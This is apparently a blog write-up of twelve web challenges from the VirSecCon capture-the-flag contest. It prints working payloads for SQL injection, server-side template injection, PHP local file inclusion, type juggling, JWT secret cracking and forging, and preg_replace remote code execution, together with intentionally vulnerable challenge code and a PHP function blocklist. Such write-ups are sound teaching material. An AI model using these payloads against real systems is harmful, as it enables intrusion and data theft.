<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
<title>VirSecCon CTF: Web Challenges | gr4n173</title>
<meta name="generator" content="Jekyll v3.8.6" />
<meta property="og:title" content="VirSecCon CTF: Web Challenges" />
<meta name="author" content="gr4n173>" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="I will explain all the web challenges that I solved." />
<meta property="og:description" content="I will explain all the web challenges that I solved." />
<link rel="canonical" href="http://localhost:4000/2020/04/17/virseccon-ctf-web.html" />
<meta property="og:url" content="http://localhost:4000/2020/04/17/virseccon-ctf-web.html" />
<meta property="og:site_name" content="gr4n173" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-04-17T00:00:00+05:45" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"VirSecCon CTF: Web Challenges","dateModified":"2020-04-17T00:00:00+05:45","datePublished":"2020-04-17T00:00:00+05:45","url":"http://localhost:4000/2020/04/17/virseccon-ctf-web.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/04/17/virseccon-ctf-web.html"},"author":{"@type":"Person","name":"gr4n173>"},"description":"I will explain all the web challenges that I solved.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/public/images/blackflag.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="gr4n173" /></head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">gr4n173<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/"><i class="fab fa-twitter"></i></a><a class="color-red-hover" href="https://gr4n173.github.io"><i class="fab fa-itch-io"></i></a><a class="color-purple-hover" href="https://github.com/gr4n173"><i class="fab fa-github"></i></a><a class="color-blue-hover" href="https://www.facebook.com/profile.php?id=100038644863435"><i class="fab fa-facebook"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/680705408297730058"><i class="fab fa-discord"></i></a><a class="color-red-hover" href="mailto:me.gr4n173@protonmail.com"><i class="fab fa-mailchimp"></i></a><a class="color-cyan-hover" href="https://www.hackthebox.eu/home/users/profile/60443"><i class="fab fa-itch-io"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="author-box">

<img src="https://gravatar.com/avatar/6691d16a4bf77dcf1f54ee766349682a?s=256" class="author-avatar" />

Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.

</div>

<div class="post">
  <h1 class="post-title"> VirSecCon CTF: Web Challenges</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/virseccon/">virseccon</a>
      
      <a class="tag" href="/tag/ctf/">ctf</a>
      
      <a class="tag" href="/tag/webchallenge/">webchallenge</a>
      
      <a class="tag" href="/tag/SSTI/">SSTI</a>
      
      <a class="tag" href="/tag/PhpJuggler/">PhpJuggler</a>
      
  </div>
  
  <div class="post-date">Published on 17 Apr 2020</div>
  
  <div class="post-description"> I will explain all the web challenges that I solved. </div>
  
  <h2 id="web-challenges">Web Challenges</h2>

<p>Web challenge was related to the Php, Server Side Template Injection(SSTI), SQL vulnerability, Jwt etc..</p>

<h3 id="1-countdown">1. Countdown</h3>
<h4 id="description-60">Description [60]</h4>
<p>We hear something beeping… is there something in the oven?</p>

<p>Connect here: http://jh2i.com:50036.</p>

<p><strong>Solution</strong>:- As I visited the site there was nothing in source-code except <code class="highlighter-rouge">defuse.php</code> so I fired my burp-suite and intercepted and got <code class="highlighter-rouge">detonate_time</code> cookie as <br />
<code class="highlighter-rouge">Cookie: detonate_time=1587109772 </code>
and changed it more than it was <br />
<code class="highlighter-rouge">Cookie: detonate_time=99999999999999999999999999</code>
this way I got the flag.</p>

<p><img src="/public/images/ctf/countdown_flag_virseccon.jpg" alt="countdown_flag" /></p>

<h3 id="2-hot-access">2. Hot Access</h3>
<h4 id="description-70">Description [70]</h4>
<p>Access to all the latest modules, hot off the press! What can you access?</p>

<p>Connect here: http://jh2i.com:50016</p>

<p><strong>Solution</strong>:- As the challenge name was <code class="highlighter-rouge">hotaccess</code> and it was using a simple php module with resources from apache web server. So I checked the <code class="highlighter-rouge">date</code> and <code class="highlighter-rouge">time</code>  got the new paramter
<code class="highlighter-rouge">http://jh2i.com:50016/?m=modules/date.php</code></p>

<p>Now I accessed <code class="highlighter-rouge">.htaccess</code> as <code class="highlighter-rouge">?m=.htaccess</code> which was a default file created by apache in every webserver and got output.</p>

<p><img src="/public/images/ctf/htaccess_virseccon.jpg" alt=".htaccess" /></p>

<p>On viewing-source code I got <code class="highlighter-rouge">sshh_don_tell_i_hid_the_flag_here</code> dir.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nt">&lt;Directory</span> <span class="err">/</span><span class="na">var</span><span class="err">/</span><span class="na">www</span><span class="err">/</span><span class="na">html</span><span class="err">/</span><span class="na">sshh_dont_tell_i_hid_the_flag_here</span><span class="nt">&gt;</span>
	
	AllowOverride All
 
 <span class="nt">&lt;/Directory&gt;&lt;/pre&gt;</span>
	<span class="nt">&lt;/body&gt;</span>
</code></pre></div></div>
<p>and visited that dir as 
<code class="highlighter-rouge">?m=sshh_dont_tell_i_hid_the_flag_here/flag.txt</code>. Then I finally got the flag with 70 points.</p>
<blockquote>
  <p><code class="highlighter-rouge">LLS{htaccess_can_control_what_you_access}</code></p>
</blockquote>

<h3 id="3-magician">3. Magician</h3>
<h4 id="description-80">Description [80]</h4>
<p>Show me a hat trick!</p>

<p>Connect here: http://jh2i.com:50000</p>

<p><strong>Solution</strong>:- Challenge presents a hash in home page <code class="highlighter-rouge">==0e953532678923638053842468642408</code>. So I tried with md5 decrypt but failed then I looked over the challenge name word ‘Magic Hash’ and got this github repo which was quite interesting one.
<a href="https://github.com/spaze/hashes/blob/master/md5.md">https://github.com/spaze/hashes/blob/master/md5.md</a></p>

<p>Entering any string of that hash I got the flag.</p>

<blockquote>
  <p><code class="highlighter-rouge">LLS{magic_hashes_make_for_a_good_show} </code></p>
</blockquote>

<h3 id="4-phpjuggler">4. PHPJuggler</h3>
<h4 id="decription-80">Decription [80]</h4>
<p>PHP is here to entertain again! They’ve shown you magic tricks, disappearing acts, and now… juggling!</p>

<p>Connect here: http://jh2i.com:50030.</p>

<p><strong>Solution</strong>:- As I visited the site and found a php code which was working in backend.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
    
    <span class="k">include</span><span class="p">(</span><span class="s1">'flag.php'</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'flag'</span><span class="p">])</span> <span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span> <span class="nb">strcmp</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'flag'</span><span class="p">],</span> <span class="nv">$flag</span> <span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">){</span>
            <span class="k">echo</span><span class="p">(</span><span class="s2">"You got it! That's the correct flag! &lt;br&gt;"</span><span class="p">);</span>
            <span class="k">echo</span><span class="p">(</span><span class="nv">$flag</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">echo</span><span class="p">(</span><span class="s2">"NOPE! Wrong flag."</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="p">(</span><span class="s2">"&lt;br&gt;&lt;br&gt;"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>   
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>Here I found <code class="highlighter-rouge">strcmp()</code> function which compares the strings and that function willn’t handle the array. So I fired my burp-suite and send parameter as an array. This way I got the flag .</p>

<p><code class="highlighter-rouge">flag=fsd</code> =» <code class="highlighter-rouge">flag[]=fsd</code></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 6
You got it! That's the correct flag!
LLS{php_dropped_the_ball_again}
</code></pre></div></div>

<h3 id="5-glhf">5. GLHF</h3>
<h4 id="description-90">Description [90]</h4>
<p>LMFAO! FLAG PLZ, THX!</p>

<p>Connect here: http://jh2i.com:50014</p>

<p><strong>Solution</strong>:- After visiting the challenge I got many urls and I noticed <code class="highlighter-rouge">FLAG</code> and submit it as<br />
<code class="highlighter-rouge">/index.php?page=FLAG</code>
and got</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> FLAG????
WTF, PLZ??? 
</code></pre></div></div>
<p>On viewing source I got</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    &lt;!-- SRY PHP LFI NBD --&gt;
</code></pre></div></div>
<p>So I php was vulnerable to LFI I brute forced with the wordlist of LFI and got the <code class="highlighter-rouge">php://filter/convert.base64-encode/resource=FLAG</code> as lfi injection point. You can visit here for more <a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf">Juggling tricks</a>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT4gUEhQTEZJWFlaIDwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KCiAgICA8aDE+IEZMQUc/Pz8/IDwvaDE+CgogICAgPGgxPiBXVEYsIFBMWj8/PyA8L2gxPgoKICAgIDwhLS0gU1JZIFBIUCBMRkkgTkJEIC0tPgoKICAgIDwvYm9keT4KPC9odG1sPgo8P3BocAogICAgLyoKICAgIC8vIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKICAgICAgICAgICAgICAgICAgICAgICAgTExTe2xtZmFvX3BocF9maWx0ZXJzX2Z0d30KCiAgICAvLyBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KICAgICovCj8+Cg==
</code></pre></div></div>
<p>I tried to decode this and got the flag.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
root@gr4n173:~# echo "PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT4gUEhQTEZJWFlaIDwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KCiAgICA8aDE+IEZMQUc/Pz8/IDwvaDE+CgogICAgPGgxPiBXVEYsIFBMWj8/PyA8L2gxPgoKICAgIDwhLS0gU1JZIFBIUCBMRkkgTkJEIC0tPgoKICAgIDwvYm9keT4KPC9odG1sPgo8P3BocAogICAgLyoKICAgIC8vIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKICAgICAgICAgICAgICAgICAgICAgICAgTExTe2xtZmFvX3BocF9maWx0ZXJzX2Z0d30KCiAgICAvLyBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KICAgICovCj8+Cg== " | base64 -d  
<span class="cp">&lt;?php</span>
    <span class="cm">/*
    // _______________________________________________________________

                        LLS{lmfao_php_filters_ftw}

    // _______________________________________________________________
    */</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<h3 id="6-jawt">6. JaWT</h3>
<h4 id="description-90-1">Description [90]</h4>
<p>Check the admin’s scratchpad!</p>

<p>Connect here: http://jh2i.com:50019/</p>

<p><strong>Solution</strong>:-On visiting the site I was able to login in as any user except <code class="highlighter-rouge">admin</code> so I fired my burp-suite and while intercepting with burp-suite I got the cookie parameter <code class="highlighter-rouge">jwt</code>  <code class="highlighter-rouge">jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.5nMC3j7S-1AH_LuDtr4LQwfnnN_3MiX--d1B07Kt07A</code></p>

<p>Header:-</p>
<blockquote>
  <p>{
  “alg”: “HS256”,
  “typ”: “JWT”
}</p>
</blockquote>

<p>Payload:-</p>
<blockquote>
  <p>{
  “user”: “user”</p>
</blockquote>

<p>I found a superb website to edit jwt <a href="https://jwt.io/">jwt.io</a>.</p>

<p>and now requied a secret key for that I used john to crack the jwt</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~#echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.DjF2o4bohTFKW9dyR6QfpU397jLnmvITGK8KgCYmXhQ" &gt; jwt
root@gr4n173:~# john jwt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
fuckit           (?)
</code></pre></div></div>
<p>I used that secret key and edited user <code class="highlighter-rouge">user</code> =&gt; <code class="highlighter-rouge">admin</code></p>

<p><img src="/public/images/ctf/jwt_token_virseccon.png" alt="jwt_token" /></p>

<p>and submited in burp-suite and finally got the flag.</p>

<p><img src="/public/images/ctf/jwt_flag_virseccon.png" alt="jwt_flag" /></p>

<blockquote>
  <p><code class="highlighter-rouge">LLS{jawt_was_just_what_you_thought}</code></p>
</blockquote>

<h3 id="7-mask">7. Mask</h3>
<h4 id="description-90-2">Description [90]</h4>
<p>Take off your mask.</p>

<p>Connect here: http://jh2i.com:50023.</p>

<p><strong>Solution</strong>:-After visiting challenge website I got the Jinja =&gt; Python template so first thing I thought was only Server-Side Template Injection(SSTI). so I tried</p>

<p><img src="/public/images/ctf/payload_virseccon.jpg" alt="ssti" /></p>

<p>and I got the <code class="highlighter-rouge">4</code> as output so then checked for <code class="highlighter-rouge">config</code> files.</p>

<p><img src="/public/images/ctf/config_virseccon.jpg" alt="config" /></p>

<p>And got the many configuration keys along with <code class="highlighter-rouge">secret key</code></p>
<blockquote>
  <p>``‘SECRET_KEY’: ‘LLS{server_side_template_injection_unmasked}`</p>
</blockquote>

<p>This way I got the flag. If you like to read more about SSTI then you can visit <a href="https://owasp-skf.gitbook.io/asvs-write-ups/kbid-267-server-side-template-injection">here</a>.</p>

<h3 id="8-10-character-web-shell">8. 10 Character Web Shell</h3>
<h4 id="description-100">Description [100]</h4>
<p>Only 10 char–</p>

<p>Connect here: http://jh2i.com:50001.</p>

<p><strong>Solution</strong>:- After visiting the challenge I got a simple php backend code.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">c</span><span class="p">];</span>

    <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">){</span>
            <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"too long!"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>and used paramter as <code class="highlighter-rouge">http://jh2i.com:50001/?c=cat flag*</code></p>

<blockquote>
  <p><code class="highlighter-rouge">LLS{you_really_can_see_in_the_dark} </code></p>
</blockquote>

<p>This way I got the flag .</p>

<h3 id="9-sequelitis">9. Sequelitis</h3>
<h4 id="description-100-1">Description [100]</h4>
<p>Sequelitis has moved to a new database for keeping track of their customers. Break in.</p>

<p>Connect here: http://jh2i.com:50034.</p>

<p><strong>Solution</strong>:- As the challenge name <code class="highlighter-rouge">Sequelitis</code> which indicate there was sqli. So at first I tried a simple payload <code class="highlighter-rouge">' or 1==1 --</code> didn’t work and slightly changed to <code class="highlighter-rouge">'or 1==1 -- -</code> I got the output</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Trey Maxam: 1010
Joe Benin: 2001
Grant Wyman: 1337
John Hammond: 1785
</code></pre></div></div>

<p>So after alot of checking the table and columns my final payload to get flag was <code class="highlighter-rouge">' union select value,2,3  from flag -- -</code></p>

<blockquote>
  <p><code class="highlighter-rouge">LLS{explicit_sqli_is_how_sql_will_die} 2: 3</code></p>
</blockquote>

<h3 id="10-dairy-products">10. Dairy Products</h3>
<h4 id="description-100-2">Description [100]</h4>
<p>There is a new advertising campaign on the classic dairy company’s website. You need to steal their latest product.</p>

<p>Connect here: http://142.93.3.19:50008</p>

<p><strong>Solution</strong>:- As soon as I visited the challenge got the hint as <code class="highlighter-rouge">git milk</code> and checked <code class="highlighter-rouge">.git</code> dir which gave me a git repo. Then I download to my localmachine .</p>

<blockquote>
  <p>root@gr4n173:~# wget -r –no-parent http://142.93.3.19:50008/.git/</p>
</blockquote>

<p>after that downloaded I used the command as</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~# git log | grep commit | awk '{print $2}' | while read line;do git show $line;done | grep -i "{.*}"
+LLS{you_gitm_gotm_good_partner}
+for i in {1..10}
</code></pre></div></div>
<blockquote>
  <p>git log =&gt;  It gives the commit history.</p>
</blockquote>

<blockquote>
  <p>grep commit =&gt; It grep the commit only .</p>
</blockquote>

<blockquote>
  <p>awk ‘{print $2}’ =&gt; It just takes the commitsha.</p>
</blockquote>

<blockquote>
  <p>while read line;do git show $line; =&gt; it makes a loop for every shacommit and show all the commit .</p>
</blockquote>

<blockquote>
  <p>grep -i “{.*}” =&gt; It grep the flag.</p>
</blockquote>

<p>This way I solved the challenge and got 100 points.</p>

<h3 id="11-irregular-expressions">11. Irregular Expressions</h3>
<h4 id="description-100-3">Description [100]</h4>
<p>Check out our new regular expressions testbed! Now you can test your regex online at!</p>

<p>Connect here: http://jh2i.com:50018/</p>

<p><strong>Solution</strong>:- After visiting the website and viewing the source code I got this.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;b&gt;Warning&lt;/b&gt;:  preg_replace(): Unknown modifier '\' in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;39&lt;/b&gt;&lt;br /&gt;
</code></pre></div></div>

<p>as <a href="https://www.php.net/manual/en/function.preg-replace.php">pre_replace()</a> there you can find <code class="highlighter-rouge">/e</code>modifier to run the eval() command so I used it</p>

<p><img src="/public/images/ctf/irregular_virseccon.png" alt="irregular_express" /></p>

<p>this way I can run the RCE so I used <code class="highlighter-rouge">system('ls -al');</code> to get the files.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total 16 dr-xr-xr-x 1 www-data www-data 4096 Apr 2 14:33 . drwxr-xr-x 1 root root 4096 Sep 4 2016 .. -r--r--r-- 1 root root 39 Apr 2 14:32 flag_name_dont_guess_plz -rwxr-xr-x 1 root root 2538 Mar 22 00:49 index.php 
</code></pre></div></div>
<p>So got the final flag using <code class="highlighter-rouge">system('cat flag_name_dont_guess_plz');</code></p>

<blockquote>
  <p><code class="highlighter-rouge">LLS{php_preg_replace_may_be_dangerous} </code></p>
</blockquote>

<h3 id="12-get-encoded">12. GET Encoded</h3>
<h4 id="description-125">Description [125]</h4>
<p>I don’t GET this%21 Do you%3F</p>

<p>Connect here: http://jh2i.com:50013</p>

<p><strong>Solution</strong>:- After visiting the challenge,viewing the source code and robots.txt. I got the dir at robots.txt.</p>

<p><img src="/public/images/ctf/robots_virseccon.jpg" alt="robots.txt" /></p>

<p>then I visited that dir <code class="highlighter-rouge">http://jh2i.com:50013/?debug</code> and got the code below.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?php

    function debug(){
        highlight_file(__FILE__);

    }
    

    // I hate these functions, they are so insecure!
    $blacklist = "assert|system|passthru|exec|assert|read|open|eval|`|_|file|dir|\.\.|\/\/|curl|ftp|glob";


    // If you supply GET arguments, process them...
    // Documentation here: http://php.net/manual/en/reserved.variables.get.php
    if ( count( $_GET ) &gt; 0 ){

        // Check if there are any bad functions in the URL supplied
        if ( preg_match( "/$blacklist/i", $_SERVER['REQUEST_URI'] ) ) {

            // If there are all, kindly tell them off. ;)
            // Documentation here: http://php.net/manual/en/reserved.variables.server.php
            die( "Go away, hacker! No unsafe functions in \$_SERVER['REQUEST_URI']!!" );
        
        }else{

            // Otherwise, execute code as a usual debugging interface.
            // Pull them out of the GET array as `variable=value` format...
            list( $function, $argument ) = each($_GET);

            // and call what they supply...
            // THIS WILL ONLY CALL ONE FUNCTION, SO YOU CAN'T INCLUDE `/?debug`
            echo("&lt;pre&gt;");
            $function($argument);
            echo("&lt;/pre&gt;");
        }

    }
    
    echo("&lt;p&gt;Machines hunt for more than humans do.&lt;/p&gt;");
</code></pre></div></div>

<p>So I sent a request with url encoding technique you see <a href="https://www.eso.org/~ndelmott/url_encode.html">here</a> <code class="highlighter-rouge">?passthru=cat flag_that_you_could_never_guess.php</code>  but not decoded the <code class="highlighter-rouge">=</code></p>

<p><img src="/public/images/ctf/getencodedflag_virseccon.png" alt="flag" /></p>

<p>This way I solved the challenge.</p>

<p>This way I was able to solve all challenges from web category except the last one.</p>

<p>I would like to thank all my reader for being with me. Stay upto date to my blog to see more writeups</p>

<p>#Stay_Safe</p>

<p>#COVID-19</p>

</div>


<div class="comments">
<div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'gr4n173'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2020/04/18/htb-mango.html">
          Hack The Box: Mango
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2020/04/13/virseccon-ctf-scripting.html">
           VirSecCon CTF: Scripting Challenges
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2020/04/07/virseccon-ctf-steganography.html">
           VirSecCon CTF: Steganography Challenges
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/.chm/" class="set-1">.chm</a> <a href="/tag/invoke/" class="set-1">Invoke</a> <a href="/tag/nosql/" class="set-1">Nosql</a> <a href="/tag/phpjuggler/" class="set-1">PhpJuggler</a> <a href="/tag/powershell/" class="set-1">Powershell</a> <a href="/tag/re/" class="set-1">RE</a> <a href="/tag/smb/" class="set-1">SMB</a> <a href="/tag/ssti/" class="set-1">SSTI</a> <a href="/tag/vscctf/" class="set-2">VSCCTF</a> <a href="/tag/virseccon/" class="set-2">VirSecCon</a> <a href="/tag/binaryexploitation/" class="set-1">binaryexploitation</a> <a href="/tag/boltcms/" class="set-1">boltcms</a> <a href="/tag/csrftorce/" class="set-1">csrftorce</a> <a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/ffuf/" class="set-1">ffuf</a> <a href="/tag/ftp/" class="set-2">ftp</a> <a href="/tag/fuzz/" class="set-1">fuzz</a> <a href="/tag/gdb/" class="set-1">gdb</a> <a href="/tag/htb/" class="set-5">htb</a> <a href="/tag/ipv6/" class="set-1">ipv6</a> <a href="/tag/jjs/" class="set-1">jjs</a> <a href="/tag/linux/" class="set-4">linux</a> <a href="/tag/linxu/" class="set-1">linxu</a> <a href="/tag/lkm/" class="set-1">lkm</a> <a href="/tag/mongodb/" class="set-1">mongodb</a> <a href="/tag/nc.exe/" class="set-1">nc.exe</a> <a href="/tag/nephack3/" class="set-1">nephack3</a> <a href="/tag/nishang/" class="set-1">nishang</a> <a href="/tag/oauth2/" class="set-1">oauth2</a> <a href="/tag/pcap/" class="set-1">pcap</a> <a href="/tag/port-forward/" class="set-1">port-forward</a> <a href="/tag/postgres/" class="set-1">postgres</a> <a href="/tag/pwn/" class="set-1">pwn</a> <a href="/tag/pwnables/" class="set-1">pwnables</a> <a href="/tag/python/" class="set-1">python</a> <a href="/tag/rce/" class="set-1">rce</a> <a href="/tag/restic-server/" class="set-1">restic-server</a> <a href="/tag/rsync/" class="set-1">rsync</a> <a href="/tag/scripting/" class="set-1">scripting</a> <a href="/tag/selenium/" class="set-1">selenium</a> <a href="/tag/server/" class="set-1">server</a> <a href="/tag/sqli/" class="set-2">sqli</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/virseccon/" class="set-2">virseccon</a> <a href="/tag/webchallenge/" class="set-1">webchallenge</a> <a href="/tag/webshell/" class="set-1">webshell</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/whoami/" class="set-1">whoami</a> <a href="/tag/whois/" class="set-1">whois</a> <a href="/tag/windows/" class="set-1">windows</a></div>
  




      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
	  <center><script src="https://www.hackthebox.eu/badge/60443"></script> </center><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');
if (theme === 'undefined') {
   theme = "dark";
}
if (theme === "dark") {
	document.documentElement.setAttribute('data-theme', 'dark');
} else {
    document.documentElement.setAttribute('data-theme', 'light');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
